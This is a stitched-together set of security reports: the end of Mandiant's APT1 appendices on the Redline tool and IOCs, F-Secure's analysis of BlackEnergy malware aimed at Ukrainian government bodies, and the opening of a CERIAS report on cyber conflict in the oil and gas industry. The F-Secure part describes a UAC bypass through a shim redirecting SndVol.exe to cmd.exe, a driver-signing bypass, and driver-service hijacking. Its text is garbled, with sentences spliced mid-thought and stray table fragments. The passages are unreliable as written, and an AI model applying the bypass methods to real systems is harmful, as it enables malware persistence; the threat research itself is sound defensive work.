Mandiant APT1	                                               70	                                       www.mandiant.com
</footer>

<section>
<heading>What Is Redline?</heading>
Redline is Mandiant’s free tool for investigating hosts for signs of malicious activity through memory and file analysis,
and subsequently developing a threat assessment profile.Redline provides several benefits including the following:
</section>

<section>
<heading>Rapid Triage</heading>
When confronted with a potentially compromised host, responders must first assess whether the system has active
malware.Without installing software or disrupting the current state of the host, Redline thoroughly audits all currently-
running processes and drivers on the system for a quick analysis; for a detailed analysis, it also collects the entire
file structure, network state, and system memory.Redline will also compare any MD5 value it collects, analyzes, and
visualizes against an MD5 whitelist.Users can further analyze and view imported audit data using Redline’s Timeline
functionality, which includes capabilities to narrow and filter results around a given timeframe with the TimeWrinkles™
and TimeCrunches™ features.</section>

<section>
<heading>Reveals Hidden Malware</heading>
The Redline Portable Agent can collect and analyze a complete memory image, working below the level at which
kernel rootkits and other malware-hiding techniques operate.Many hiding techniques become extremely obvious when
examined at the physical memory level, making memory analysis a powerful tool for finding malware.It also reveals
“memory only” malware that is not present on disk.</section>

<section>
<heading>Guided Analysis</heading>
Mandiant’s Redline tool streamlines memory analysis by providing a proven workflow for analyzing malware based on
relative priority.This takes the guesswork out of task and time allocation, allowing investigators to provide a focused
response to the threats that matter most.Redline calculates a “Malware Risk Index” that highlights processes more likely to be worth investigating, and
encourages users to follow investigative steps that suggest how to start.As users review more audits from clean and
compromised systems, they build up the experience to recognize malicious activity more quickly.As you investigate a system, here’s how Redline will help you focus your attention on the most productive data:
</section>

<section>
<heading>Investigative Steps</heading>
Redline can collect a daunting amount of raw information.Its investigative steps help provide a starting place by
highlighting specific data and providing views that are most commonly productive in identifying malicious processes.Unless you are pursuing a specific “lead”, we recommend working through the steps in order, examining the
information for entries that don’t match your expectations.The key to becoming an effective investigator is to review Redline data from a variety of “clean” and “compromised”
systems.Over time, your sense of which entries are normal and which are of concern will develop quickly as you view
more data.</section>


<footer>
Mandiant APT1	                                              71	                                          www.mandiant.com
</footer>

<section>
<heading>Malware Risk Index Scoring</heading>
Redline analyzes each process and memory section using a variety of rules and techniques to calculate a “Malware
Risk Index” for each process.This score is a helpful guide to identifying those processes that are more likely to be
worth investigating.Processes at the highest risk of being compromised by malware are highlighted with a red badge.Those with some risk factors have a grey badge, and low-risk processes have no badge.The MRI is not an absolute indication of malware.During an investigation you can refine the MRI scoring by adjusting
specific hits (identifying false positives and false negatives) for each process, adding your own hits, and generally
tuning the results.</section>

<section>
<heading>IOCs</heading>
Redline provides the option of performing IOC analysis in addition to MRI scoring.Supplied a set of IOCs, the Redline
Portable Agent will be automatically configured to gather the data required to perform a subsequent IOC analysis; after
the analysis is run, IOC hit results are available for further investigation.In addition, Redline provides the ability to create an IOC Collector.This feature enables the collection of data types
required for matching a set of IOCs.</section>

<section>
<heading>Works with MIR</heading>
Combined with MIR, Redline is a powerful tool for accelerated live response.However, much of the detection capability in this set of indicators has already been available to
our MIR customers.The IOCs may look different though as a result of improvements in creation and testing.Mandiant
started 2013 with a focus on taking better advantage of our threat intelligence.We plan to continue to improve the
synthesis of our threat intelligence and our IOCs by improving our breadth, IOC creation process, IOC management
process, and IOC testing.The majority of these indicators, or modified versions of them, will be integrated into the next
IOC release.</section>

<section>
<heading>What Is the FAMILY Designator in This Set of IOCs?</heading>
We are using a new IOC designator in these IOCs called “(FAMILY).” Mandiant’s Threat Intelligence Unit tracks
malware by common features seen in groups of binaries.We call those groupings of binaries “families.” The IOCs
included in this appendix are representatives of families of malware used by APT1.The new designator follows the
family name in the “Name” field of the IOC, and the presence of (FAMILY) implies that that IOC applies to the whole
family, not just one sample.</section>

<section>
<heading>Why Do These IOCs Look Somewhat Different Than Other IOCs I Have Seen From
Mandiant?</heading>
In many cases we have combined information that previously would have been in several indicators into a single
indicator.Additionally, we have removed certain types of intelligence, since they are being released in separate
appendices (such as FQDNs and IPs).Additionally, some IOCs in this set are using file permutation blocks to catch variants of malware that might not be
detected otherwise.</section>

<section>
<heading>What Is a File Permutation block?</heading>
It is a different way to structure lists of File Item attributes to look for an entire family of malware versus only one or two
pieces.For more information on this topic or most any other IOC questions go to https://forums.mandiant.com.</section>

<section>
<heading>Will You Update These IOCs?</heading>
It is likely that we will make some changes to the IOCs in Appendix G as we get feedback.If updated, the updates will
be available in the same location as the report http://www.mandiant.com/apt1.</section>

<section>
<heading>Will You Be Releasing More IOCs Like This?</heading>
Currently, there are no plans for additional public releases of this magnitude.</section>


<footer>
Mandiant APT1	                                                73	                                           www.mandiant.com
</footer>

<section>
    <heading>                   Appendix H (Digital):
                                 Video</heading>

This appendix is digital and can be found at http://www.mandiant.com/apt1.It includes a compilation of videos showing
actual attacker sessions and their intrusion activities.</section>

<footer>
Mandiant APT1	                                           74	                                        www.mandiant.com
</footer>

</doc>In the summer of 2014, we noted that certain
samples of BlackEnergy malware began targeting Ukranian
government organizations for information harvesting.These
samples were identified as being the work of one group,
referred to in this document as “Quedagh”, which has a history
of targeting political organizations.The Quedagh-related customizations to the BlackEnergy
malware include support for proxy servers and use of
techniques to bypass User Account Control and driver
signing features in 64-bit Windows systems.While monitoring
BlackEnergy samples, we also uncovered a new variant used by
this group.We named this new variant BlackEnergy 3.The use of BlackEnergy for a politically-oriented attack is an
intriguing convergence of criminal activity and espionage.As
the kit is being used by multiple groups, it provides a greater
measure of plausible deniability than is afforded by a custom-
made piece of code.Originally, it was designed as a toolkit for creating     
botnets for use in conducting Distributed Denial of Service     
(DDoS) attacks.Over time, the malware has evolved to           
support different plugins, which are used to extend its         
capabilities to provide necessary functions, depending on       
the purpose of an attack.Given the nature of its toolkit, BlackEnergy has                
unsurprisingly been used by different gangs for different       
purposes; some use it for sending spam, others for stealing
banking credentials.The most notorious use may be when         
it was used to conduct cyberattacks against Georgia during      
the Russo-Georgian confrontation in 2008.In the summer of 2014, BlackEnergy caught our attention         
when we noticed that samples of it were now tailored to         
target Ukrainian government institutions.Though it may
be unrelated, it is interesting to note that this change
conveniently coincides with the on-going crisis in that
country.Related or not, one thing is certain: the actor(s)
using these customized BlackEnergy malware are intent
on stealing information from the targets.The use of this
crimeware in what constitutes as an advance persistent
threat (APT) attack is interesting.In ‘black operations’
(black ops), an important criteria is that the attack should
not be attributable - and what provides better plausible
deniability than crimeware known to be used by multiple
parties?In this paper we focus only on BlackEnergy samples
known to be used specifically by the actors we identify
as Quedagh, who seem to have a particular interest in
political targets.Special focus will be on the samples
that were used in targeted attacks against Ukrainian
government organizations earlier this year.</section>

<section>
ATTACK OVERVIEW
At the time of writing, we have little information on how       
exactly victims are receiving the BlackEnergy malware           
being pushed by the Quedagh gang.An educated guess             
is that they are receiving the malware via targeted emails      
containing malicious attachments.Meanwhile, the                
following infection and technical details are based on          
samples gathered after searching through F-Secure Labs’         
collection of all BlackEnergy samples and identifying           
those with Quedagh characteristics.The BlackEnergy toolkit comes with a builder application
which is used to generate the clients that the attacker(s)
use to infect victim machines.The toolkit also comes
with server-side scripts, which the attackers set up in
the command and control (C&C) server.The scripts also
provide an interface where an attacker can control his
bots.The simplicity and convenience provided by the
toolkit means that anyone who has access to the kit can
build his own botnet without any skills required.<caption>Figure 1: BlackEnergy Builder from 2007</caption>

<figure></figure>

                                                
<header>The convergence of crimeware and APT attacks BLACKENERGY & QUEDAGH
                                                                                                                            3
</header>


The original BlackEnergy toolkit first emerged in 2007 and       
is referred to in this paper as BlackEnergy 1.A later variant   
of the toolkit (BlackEnergy 2) was released in 2010.We also     
encountered a previously unseen variant, which had been          
rewritten and uses a different format for its configuration.It also no longer uses a driver component.We dubbed this        
new variant BlackEnergy 3.</section>
          
<section>                                                                 
<heading>INFECTION VECTORS</heading>                                                
Most of the recent BlackEnergy installers collected are          
named msiexec.exe.We believe they are either dropped            
by another executable that uses social engineering tricks        
to mislead the user into executing the installer, or by          
documents containing exploits that silently perform the          
installation.We found at least 2 trojanized legitimate applications that      
execute the installer (in addition to their legitimate tasks).Trojanization is an effective infection method, as most
users have no way of observing that a malicious component
is being installed in tandem with a legitimate program.Some earlier installer variants, then named regedt32.exe, were distributed by documents exploiting software
vulnerabilities, one of which was CVE-2010-3333.These
documents drop and execute the installer, then open a
decoy document.It is reasonable to assume that a similar
approach has been used to deliver the more recent
installer variants.The installer filename of BlackEnergy 3 is still msiexec.exe.However, it is delivered and executed by a dropper which
opens a decoy document in the foreground.We also
encountered a standalone, non-persistent sample that
pretends to be Adobe Flash Player Installer.It does not use
any decoy document or application and does not run after
reboot.The overview below summarizes the various infection
vectors used by the Quedagh gang to deliver BlackEnergy
crimeware to the designated targets.Apart from other indicators, we can
deduce the nature of the target based on the content of
social engineering tactics used to distribute the installers.For example, one decoy dropped from a sample dating to
2012 (image 2) seems to be targeting European audiences
and discusses a political/economic situation.Strings found
in another sample from 2012 (image 3) again indicate
a political motivation behind the attack.Most decoys
used content taken from news sites; we noted one decoy
dropped by an exploit document was created using the
Russian version of Office (image 4).<figure></figure>
        <caption>Image 2:
Decoy document circa 2012</caption>

<figure></figure>
          <caption>Image 3:
Strings from a sample circa 2012</caption>

The latest variant of the dropper pretends to be a
document file with a Ukrainian filename (image 5).The choice of language for the filename again may tie
in or reference the current political crisis in that country.The filename itself means ‘password list’ in English.</section>

<section>
<heading>2008 CYBERATTACKS ON GEORGIA?</heading>
During our investigation, we found interesting details
that lead us to suspect that Quedagh might have been
involved in the cyberattacks launched against Georgia
during the 2008 Russo-Georgian confrontation.While the
details identified are suggestive, they are not conclusive;
they do however seem consistent with the group’s
involvement in subsequent targeted attacks.</section>

<section>
<heading>UKRAINE-RELATED PROXIES</heading>                                              
While examining the samples collected during our                     
BlackEnergy monitoring, we noticed that samples from
this year had been updated to support the use of proxy
servers while connecting to their C&C servers.This
contrasts with earlier BlackEnergy 2 variants, which do
not support proxy servers.In some network setups, a
proxy server is needed to allow internal users to access
the Internet <fn>[1]</fn>.BlackEnergy¹s use of a proxy server may
indicate that the gang has prior knowledge of the target
organization’s internal setup to note of this requirement.For example, in one sample the configuration uses
the proxy server associated with the Ukrainian Railway
(image 6).The configuration from another sample
also shows it using an internal proxy under the giknpc
domain (image 7).The domain giknpc.com.ua in turn
hosts 3 domains (image 8), one of which is for the city
of Dnipropetrovsk (image 9), the fourth-largest city in
Ukraine, located in the southeast.Based on the set proxy
servers for the different samples, we concluded that the
gang is targeting Ukrainian government organizations.Initially, the group seemed to prefer to use the filename of     
the Windows registry editor (regedt32.exe), presumably           
because the installer needs administrator rights to install
its driver component and therefore would try to request
for the highest available rights (image 10), if possible.As
this triggers a notification message visible to the user, said
user is more likely to grant permission if it appears to be
the registry editor that is requesting for permission, since
it is normal to run it with administrator rights.Experienced
users though are less likely to be taken in, thereby
decreasing the likelihood of a successful infection.<figure></figure>
                  <caption>Image 10:
Installer requesting highest available rights</caption>

Starting April 2013, modified installers appeared showing
that the Quedagh group found a way to bypass the default
User Account Control (UAC) settings.With this change,
the user’s permission is no longer need (image 11).At this
point, the gang also began to use the Windows installer
program filename msiexec.exe.<figure></figure>
                  <caption>Image 11:
Installer execution privilege level amended</caption>
</section>

<section>
<heading>64-bit support</heading>
Within a month of Windows 8.1’s release, the gang
had quickly added support for 64-bit systems, possibly
anticipating that more of their target systems will be
migrated to 64-bit systems.They also employ a neat
trick to bypass the driver signing requirement on 64-            
bit Windows systems.As a side note, this latest finding         
updates and supercedes previously published research
related to BlackEnergy’s driver signing behavior <fn>[2]</fn>.However, this trick doesn’t work on Windows 8 and
later systems.The driver also crashes occassionally.This
could be the reason for the stand-alone non-persistent
BlackEnergy variant.</section>

<section>
<heading>BlackEnergy 3</heading>
We identified the new BlackEnergy 3 variant first by the
change in its configuration, which differed from those
of its two predecessors, 1 and 2 (images 12 to 14).It also
no longer uses a driver component [3].Further technical
details are documented on page 10 to 11.If not, it will re-launch itself as Administrator on Vista.This in effect will trigger a UAC prompt.On Windows 7        
and later however, the malware will attempt to bypass the     
default UAC settings.It exploits a backward-compatibility    
feature found in newer versions of Windows.BlackEnergy       
installers include a Shim Database, or a “fix”, instructing   
SndVol.exe to execute cmd.exe (image 15, below) instead       
in order to resolve the incompatibility.SndVol.exe is one of the Windows executables that will        
be automatically elevated upon execution because it
is thought to be safe.What harm can a volume control         
cause?With the malicious “fix” installed however,            
executing SndVol.exe will execute the not-so-safe file        
cmd.exe instead, which can then be used to install the        
malware while in an elevated state.</section>

<section>
<heading>DRIVER SIGNING POLICY BYPASS</heading>
The role of the installer is to set up the malware’s
persistent component, which is the driver component.On 64-bit Windows systems, Microsoft has enforced a
policy that requires all drivers to be signed as a security
precaution.Signing provides a way to identify a driver to
its author, effectively reducing the number of malware
developers willing to take the risk.To allow developers to
test their drivers during development, Microsoft provides
a TESTSIGNING boot configuration option; while in this
mode, a watermark is displayed on the screen to make it
obvious to users and to prevent malware from exploiting
this option.BlackEnergy enables the TESTSIGNING option to load its
driver component; to hide this change from the user, the
malware removes the watermark by removing the relevant
strings in the user32.dll.mui of the system.In Windows
8 and up however, the strings are no longer stored in
user32.dll.mui, so the trick will not work.This may be one
of the reasons for the existence of a standalone non-
persistent BlackEnergy variant.The malware does not
infect 64-bit Windows systems that are older than Vista.<caption>Image 15: Malicious fix to redirect SndVol.exe to cmd.exe.Inset: Test Mode watermark</caption>
<figure></figure>
</section>             
                                               
<header>
The convergence of crimeware and APT attacks BLACKENERGY & QUEDAGH
                                                                                                                              9
</header>

<section>
<caption>DIAGRAM 1: INSTALLATION FLOW </caption>                                  
<figure>
                 Need rights?Previously contained an uninstall routine.10         Returns the registry path and driver file path
</table>
</section>

<section>
 <heading>HIJACKING EXISTING DRIVERS</heading>                                          
 The installer will try to locate an existing driver service         
 that is inactive.The service found will usually be a               
 legitimate one that is disabled because it is no longer             
 used or because it is set to start only on demand.The              
 installer will drop the driver component using the
 corresponding path of the service.It will overwrite the            
 existing driver if necessary.The hijacked service is then          
 set to start automatically.This is how the malware is able         
 to survive after a reboot.By doing this, the gang may be           
 hoping that their malicious driver will be overlooked by            
 administrators or investigators who are so used to seeing           
 those legitimate services.</section>

 <section>                                                                    
 <heading>DRIVER COMPONENT</heading>
The only component that will remain permanently on the
infected system will be the driver component.The driver
component used by the gang is a stripped down version
of the BlackEnergy 2 driver.The sole purpose of this driver component is to inject
the main DLL component into svchost.exe.Interestingly,
it does not contain the rootkit functionalities for hiding
processes, files and registry objects that is found in the
usual BlackEnergy 2 drivers.The gang may have opted for
a ‘hide in plain sight’ approach to evade detections from
rootkit scanners, such as GMER and RootkitRevealer, that
checks for system anomalies.The driver component provides a IOCTL interface to
communicate with the main DLL component.Table 1
(above) summarizes the command codes that can be
passed to the IOCTL buffer.The 32-bit version contains
additional, incomplete routines for hiding processes via
direct kernel object manipulation (DKOM) and managing
BlackEnergy 2 rootkit rules in memory <fn>[2]</fn>.Table 2 (above) summarizes             
the differences between the driver component used by            
Quedagh compared to the typical BlackEnergy 2.</section>                                                                
          

<section>                                                                
<heading>MAIN DLL COMPONENT</heading>                                              
The core functionality of BlackEnergy 2 is found in the
main DLL component.This component is embedded inside
the driver component and is not found in the file system;
                                                                
this is to reduce the infection footprint on the system.The main DLL provides a robust framework for attackers          
to maintain a botnet that is not tied to any specific           
functionality.The malware is designed to be used by            
loading customized plugins depending on the purpose             
of the botmaster.It is mainly a framework for plugins          
to communicate with a central command and control.Otherwise, the main DLL only provides a minimal set of
commands.Table 3 (above) summarizes the commands
supported by the variants used in the attack against
Ukrainian government organizations.In BlackEnergy 2, the main DLL component communicates
with its plugins via a defined set of API calls.It exports
a number of function calls, which can be used by the
plugins.On the other hand, plugins are required to export
2 functions to work.We highly recommend the research
of Dell SecureWorks for those looking for more details
regarding the BlackEnergy 2 plugin framework.</section>


<section>
<heading>BLACKENERGY 3</heading>
In contrast to previous variants, BlackEnergy 3 uses a
simpler installer component.It does not have a driver
component and the installer drops the main DLL
component directly to the local application data (non-
roaming) folder.The installer then creates a LNK file in the
startup folder, using a filename generated based on the
volume serial number as a launch point.The LNK file is a
shortcut to execute the main DLL using rundll32.exe.The               
configuration data is a series of X509_ASN encoded values       
                                                                
and are accessed by an ID number.Table 4 summarizes
                                                                
the fields and their equivalent BlackEnergy 2 XML node,         
while table 5 lists the completely new set of commands          
used in this latest variant.BlackEnergy 3 also uses a different method of                   
communication with its plugins, as it now communicates          
via RPC over the named-pipe protocol (ncacn_np).</section>                                                                
          
<section>                                                                
<heading>INFORMATION-STEALING PLUGIN</heading>                                     
                                                                
Since the main DLL component offers little clue as to what      
the malware was used for, we need to look at the plugin to      
determine the objective of the gang.One particular plugin that was used in the campaign was         
called “si”, perhaps to mean ‘steal information’.This may be because the
malware has roots from crimeware.The information is still
useful however as such data makes it easier for the gang
to plan any further attacks on the same targets.BlackEnergy 2 configuration may
       also contain initial commands to execute.2     Main DLL reports to C&C.Main DLL processes the configuration data
 3     returned by the C&C.This time, it processes
       fields related to plugins and commands.The actual bot_id
string in which the id hash is derived is also a bit different;
it now uses the format [domain_sid]_[host_name]_
[serial_no].The response of the command and control server will
be encrypted using the id field in the POST request as
the key.After the response is decrypted, it will be in the
form of the corresponding configuration data of the
BlackEnergy sample; for example, BlackEnergy 2 samples
expect the decrypted response to be a XML document,
while BlackEnergy 3 samples expect the decrypted
response to be a series X509_ASN encoded values.The decrypted response, which is equivalent to another
configuration data, will be processed similar to the initial
configuration data embedded in the main DLL; the only
differences are the data fields that are processed.This
cycle is illustrated in diagram 3 (above).The main DLL also uses the fields listed in table 6 (above)
when it needs to download additional files.</section>
                                              
<header>
The convergence of crimeware and APT attacks BLACKENERGY & QUEDAGH
                                                                                                                      13
</header>

<section>
<heading>CONCLUSIONS</heading>
BlackEnergy is a toolkit that has been used for years
by various criminal outfits.In the summer of 2014, we
noted that certain samples of BlackEnergy malware
began targeting Ukranian government organizations for
information harvesting.These samples were identified as
being the work of one group, referred to in this document
as “Quedagh”, which has a history of targeting political
organizations.Though inconclusive, suggestive details
indicate that BlackEnergy malware, possibly also from this
gang, may also have been used in the Russo-Georgian
confrontation in 2008.The Quedagh-customizations to the BlackEnergy malware
include support for proxy servers (which, in the samples
examined are associated with Ukrainian entities) and
use of techniques to bypass User Account Control and
driver signing features in 64-bit Windows systems.While
monitoring BlackEnergy samples, we also encountered a
new variant, which we dub BlackEnergy 3, with a modified
configuration, no driver component and a different
installation procedure.The use of BlackEnergy for a politically-oriented attack
is an intriguing convergence of criminal activity and
espionage.As the kit is being used by multiple groups, it
provides a greater measure of plausible deniability than is
afforded by a custom-made piece of code.</section>


<footnote>
<heading>REFERENCES</heading>
1.Wikipedia; Proxy server; http://en.wikipedia.org/wiki/Proxy_server#Cross-domain_resources
2.Broderick Aquilino; F-Secure Weblog; BlackEnergy Rootkit, Sort Of; 13 June 2014;
    http://www.f-secure.com/weblog/archives/00002715.html
3.Broderick Aquilino; F-Secure Weblog; Beware BlackEnergy If Involved In Europe/Ukraine Diplomacy; 30 June 2014;
    http://www.f-secure.com/weblog/archives/00002721.html
4.Kafeine; Malware don’t need Coffee; BotnetKernel (MS:Win32/Phdet.S) an evolution of BlackEnergy ; 21 June 2014;
    http://malware.dontneedcoffee.com/2014/06/botnetkernel.html
5.Basis for the start of the
                                                 Ukrainian target.This means that it is highly probable that there is a trojanized
                                                 Adobe package out there.We offer millions of people around the globe the power to surf          
 invisibly and store and share stuff, safe from online threats.We are here to fight for digital freedom.Join the movement and switch on freedom.Founded in 1988, F-Secure is listed on NASDAQ OMX Helsinki Ltd.
 </cover> 

</doc><doc>
<cover>
<heading>CERIAS Tech Report 2013-9</heading>
<heading>Crude Faux: An analysis of cyber conflict within the oil & gas industries</heading>
by Kambic, K., Aurthor, K,.As modern technology has developed, both the corporate aspects and technical aspects of the oil & gas industry have become heavily reliant on the Cyber domain.The inherently insecure origins and evolution of computing has led that dependence to become a severe vulnerability.This report examines how these vulnerabilities have been exploited, and what that means to the future of the industry.</section>

<section> 
<heading>Executive Summary</heading>

The oil & gas industry is a multibillion-dollar industry that has a history of conflict.As modern technology has developed, both the corporate aspects and technical aspects of the oil & gas industry have become heavily reliant on the Cyber domain.The inherently insecure origins and evolution of computing has led that dependence to become a severe vulnerability.Recent events have brought this fact to light with a deluge of “cyber attacks” launched globally against the industry.These attacks raise specter of cyber conflict and the question of culpability.This report seeks to analyze a selection of these events, looking for patterns that would indicate one or more advanced actors.By observing the motives means and opportunities presented to actors, and looking at a cross section of these attacks over time, conclusions will be drawn as to the past, present, and future of cyber conflict within the industry.The US Army notes in their Cyber Concept & Capabilities plan for 2016-2028 that cyber capabilities pose a unique and attractive opportunity to an inferior enemy to gain equivalence temporary equivalence with a superior enemy through the use of Cyber.This applies not only to nation states, but non-state actors as well.<heading>Methods:</heading> Using OSINT techniques, information was gathered from government websites, corporate websites, news agencies, and search engine queries.This information was then synthesized and scrutinized for possible links and attribution.By looking at the surrounding geopolitical events, gains and losses as well as indirect outcomes, events can be correlated and attributed to actors which possess the means motive and opportunity to do so.The primary purpose is to analyze the event regardless of attribution.Because of the nature of open source information, biases are naturally introduced which must be acknowledged, if not accounted for.<heading>Events:</heading> Incidents were selected based on relevance and their timeliness, along with other factors discussed in the methodology.Incidents were largely grouped into one of three categories: espionage, sabotage, and incidental/miscellaneous.While these incidents do not qualify as warfare by the Clausewitz definition, they are a form of conflict.<heading>Cyber Espionage:</heading> There is significant evidence of protracted, insidious espionage carried out by a state actor within the cyber realm.China has likely launch hundreds of cyber attacks against the oil and gas industry since as early as 2002.With the advent of Red October, they may not be the only actors in the game.With a level of sophistication not yet observed publicly in this realm, Red October could represent an evolution to China’s current techniques, or another actor entering the game.By looking at some of the technical aspects of the events, a link was established between Byzantine Candor and APT1, as well as a possible link between the Mirage Campaign and Elderwood Project.<heading>Sabotage:</heading> The Middle East has scene perhaps the most evidence and variety of cyber conflict of all.While staying away from events which do not directly relate to the oil industry, a series of sabotage incidents using cyber as the medium are examined.It is possible that there events were salvos between nation states in an example of bidirectional conflict.If this is not the case, and incidents like Shamoon were simply the act of non-state actors, then it represents affirmation of the revelence of non-state actors in future cyber conflict.This is only logical since most of America’s critical infrastructure is controlled by the private sector, and economic influence can be leveraged to gain great power.<heading>Incidental:</heading> By taking an adversarial look at the Deepwater Horizon oil spill, an example of how a state actor could act in a violent, kinetic way against a non-state through cyber while remaining anonymous is examined through a vignette.It is determined that while the Deepwater horizon spill was not an attack, it easily could have been.This type of conflict is both deadly and catastrophic, and while it is unlikely to be used lightly, it sets the tone for possibilities going forward.<heading>Conclusions:</heading>

Based on the observed events, the possible threat actors, and the correlation of these events, it appears that there is ongoing cyber conflict within the oil industry.The correlation of several incidents has shown coordinated attacks by an advanced foreign threat actor against multiple entities with the use of espionage.It has also suggested the possibility of more destructive attacks, and pointed out the benefits to both state actors and non-state actors within the oil industry.In some cases there has been an obvious alignment of political, strategic, operational, and tactical goals and principals to affect favorable outcomes.The culmination of these findings is that there are many threat actors who are currently engaged in, or may be engaged in, ongoing conflict which may have the potential to escalate.This should be both a primary concern and a cause for future research and analysis.</section>


<section>
<heading>Introduction</heading>
Recent events of national significance within the oil & gas Industry have brought to light both the question of defining threat sources and that of plausibly attributing known events to a threat source.The unprecedented rise in cyber events begets the question of whether this is incidental to the continued advancement of technology, or suggests an ongoing conflict that may escalate.This report will aggregate relevant events, present criteria for outlining threat origins, and determine the likelihood that the incidents are related.It also seeks to determine whether or not any observed correlation points to a persistent aggressor or simply circumstantial coincidence.The purpose of this analysis is to provide decision-makers with a clearer idea of the current security outlook for the oil and gas industry, and pinpoint what current and future causes for concern appear to be.All events and presented options should be considered cautiously and as empirically as possible; any assumptions that are made will be explicitly stated.</section>


<section>
<heading>Timeline of Events</heading>

One of the first priorities is to outline a timeline of events which have occurred and then examine what significance they may have or relationships they may share in order to scope the conversation.These events will constitute the frame for the analysis.Events were chosen after a preliminary overview of content from open sources such as established news media sites, oil & gas company websites, Google query results, government bulletins, and technical reports by security companies.From this brief overview, events within the Oil and Gas Industry which exhibited a “cyber” component were selected.These events are not meant to be all inclusive, and due to the entirely open source nature of the resources, the vantage point on the information may be biased and in many instances is likely incomplete.However even an incomplete view may contain enough information to identify significant patterns, and by acknowledging the quality concerns with the information, a more accurate and objective analysis may be performed.Below is a timeline of observed events which will be discussed in greater detail.The timeline will list the event and the apparent target of the event.This can partially be explained by a growing international awareness of the vulnerabilities and perils involved in internet-facing control systems of all kinds; as events occur, they garner additional attention and therefore induce additional incidents.However, there are other interesting observations to be made from this data.Largely, the incidents of great note have occurred in either North America or the Middle East.When considering that three of the top five oil producing countries are in these regions (Saudi Arabia, the United States, and Iran), this is not surprising.Yet substantive reports of similar incidents are markedly absent in the other two of the top five oil producing countries (China and Russia), and this is noteworthy.The argument could be made that this is due to language barriers and tight control on information dissemination, but it is improbable that a significant incident would have gone entirely unnoticed by all media outlets.As the incidents themselves make apparent, human threat actors are involved, and what remains to be identified is whether there is the complexity, overarching coordination, or recurring threat source that would point to an advanced threat such as a state actor or complex non-state actor.Before continuing with the possible attribution of events, some base discussion and criteria for the threat sources must be established.A threat source is considered to be a human-based or natural entity which possesses a capability that aligns with an unmitigated vulnerability.The threat sources which will be considered must meet the minimum requirement of having both the motive and the means to carry out the attack.Once a hypothesis consisting of these elements is established, it will be scrutinized to determine whether or not the events surrounding the incident or series of incidents align in any obvious political, strategic, operational and tactical manner.The means in this case consists of both the opportunity and the technological capability to cause the incident to occur, and the motives that will be considered are economic gain, retribution, or political agenda (to include ideology).The US Army notes in their Cyber Concept & Capabilities plan for 2016-2028 that cyber capabilities pose a unique and attractive opportunity to an inferior, asymmetric enemy to temporarily gain equivalence with a superior enemy because of its relatively low initial cost, high return on investment, and plausible deniability due to issues with attribution.Because of this fact, it is highly likely that multiple foreign agencies as well as powerful corporate denizens have used and continue to make use of cyber capabilities to affect favorable outcomes.The rest of the report will attempt to substantiate this claim through critical analysis.</section>

<section>
<heading>Methods</heading>
To reach the conclusions presented in the ensuing report incidents were collected and chosen based on the inclusion of cyber either as the medium for the event, or as some component factor that played a direct or otherwise instrumental role in the outcome.After collecting a sampling of incidents into a dataset, these incidents were examined and several directly attributable features/impacts were taken into account, including:

- The victim(s) targeted
- Evidence of cyber involvement
- Economic losses
- Fatalities incurred
- Geopolitical impacts

Beyond the direct impacts, it was also necessary to consider possible indirect “ripple” effects.For example, it could be important to consider something like the prices of crude oil prior to and after a given incident.A circumstance may be such that particular companies or countries unaffected by the incident would find themselves benefiting from a ripple effect like higher crude prices.Other effects to identify include changes in the status of the involved companies throughout an incident.This could involve looking at earnings reports, the selling or buying of assets, or any legal actions the company is involved in, as well as contextual events that are significant or contentious and occur directly prior to or after an incident.Through the investigation of these outcomes and contexts, there is the possibility of finding correlations between various incidents.These correlations may be made plain by observable patterns among the details of the events.An observed pattern may suggest a recurring actor—these patterns include tactical and methodical similarities between alleged attacks, recurring targets, entities that directly or indirectly benefitted or incurred losses as an outcome, and geographic dispersion or closeness of the events.In cases where an attack is apparent, tactical elements such as tools were scrutinized as well, as a means of attribution.For example, a tool may unintentionally exhibit cultural tendencies such as the language used, colloquialisms, idioms, religious preference, and recurring personal habits of the creator or operator.These signatures coupled with aspects of the tactical assets like exclusiveness (as in the case of a purchased domain used as a C2 point) can significantly raise the confidence level of an attribution.Possible actors in the cyber exchange can ostensibly be identified from these correlations.If it is determined that the incident was an attack, motives of the potential actors can be considered.A key element of this that should be considered is any precedence for the attack.The history of political relationships between countries, such as any expressed hostilities or allegiances and treaties, may also prove relevant.History also tells us that most conflicts arise over the acquisition of resources.As such, the energy resources and requirements of nation-states must be analyzed.For example, is the entity being examined a major importer or exporter of oil?Is the entity capable of energy self-sufficiency?Or has the country been experiencing a major influx in energy demand?This information can then be aggregated and synthesized into a more informed view of the event.A final major component of the analysis was the examination of whether the motives and methods align with the actor’s strategic culture.This includes defining the overall strategic theories that the country adheres to and goals it desires to accomplish.As mentioned earlier, the tactics employed during the attack can be incredibly potent as an attribution mechanism—if an attack is far removed from a nation’s capabilities, it is less likely that they were involved in the incident.Likewise, if the tactics are within a given nation’s technical prowess and follow established patterns exhibited by that nation, it significantly improves the confidence in attribution.However, caution was taken when attributing tactics to actors, as deception is a common element in many cyber warfare strategies.Therefore, tactical similarities or dissimilarities alone do not implicitly identify or rule out a given actor.</section>

<section>
<heading>Biases</heading>

The nature of OSINT gathering poses obstacles to objective analysis.While gathering the data, it should be noted that there are source biases.All of the sources used are open source, and as such the provenance of the information cannot always be independently verified.The information itself may be legitimate, but presented in an incomplete or skewed manner.It is also likely that not all of the details of the collected incidents are available.In some cases the companies reporting the incidents, such as Symantec and MacAfee, are not legally disposed to divulge select information about their customers.Another limitation is information available about incidents that occurred in foreign countries.Due to tighter control over journalism or language barriers, other countries are likely not releasing full details from incidents that have occurred or not doing so in languages familiar to the authors.In some cases, entire events may not be released to the public, either by foreign governments or the companies themselves.In order to address the above concerns, several methods were used.Data was gathered from established, and ideally trustworthy, sources.This includes reports from reputable news sites, company or government publications, or scholarly papers.Also, every effort was made to track down the original source of the information found in reports, or cross-examine it with other sources.Multiple sources were found wherever possible and scrutinized in order to obtain corroborating data.Of equal interest is information which was contradictory between sources.These contradictions were presented and addressed where appropriate.Finally, despite evidence found in support of any given actor, alternate hypotheses must be considered.As with any intelligence gathering, there is the possibility of error, whether information is misreported or taken out of context, and this is especially true of OSINT.The purpose was not to select an outcome and attempt to support it but rather to find refutation as well.Information that may exculpate a particular actor was thoroughly considered.Although human error is common in cyber incidents, it is important to determine whether the error was taken advantage of by others.</section>

<section> 
<heading>Cyber Espionage</heading>
 
